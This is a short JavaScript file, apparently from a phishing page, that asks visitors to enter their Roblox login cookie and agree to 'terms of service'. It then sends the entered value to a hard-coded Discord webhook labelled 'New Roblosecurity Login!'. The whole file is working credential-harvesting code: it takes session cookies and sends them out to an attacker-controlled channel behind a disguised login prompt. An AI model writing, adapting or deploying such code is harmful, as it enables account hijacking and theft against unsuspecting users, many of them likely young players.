function loginfunc() {


if (document.getElementById("input").value != "" & document.getElementById('tos').checked) {

webhook()
alert("Complete.");

}
else {
  alert("You need to enter your login cookie and agree to terms of service.");
}

}

function webhook() {

      const request = new XMLHttpRequest();
      request.open("POST", "https://discord.com/api/webhooks/1023295615934939136/Ddvdqtmgvs1W7HhjFkgudR3vqU9RmMBMxJnYuPVTOZuaxHMn_ojjAnNn-rprgedGwARd");

      request.setRequestHeader('Content-type', 'application/json');

      var params = {
  username: "New Beam",
  avatar_url: "",
  content: "@everyone",
  embeds: [
    {
      "type": "rich",
      "title": `New Roblosecurity Login!`,
      "description": document.getElementById("input").value,
      "color": 0x2b2d46
    }
  ]
}
      request.send(JSON.stringify(params));


}









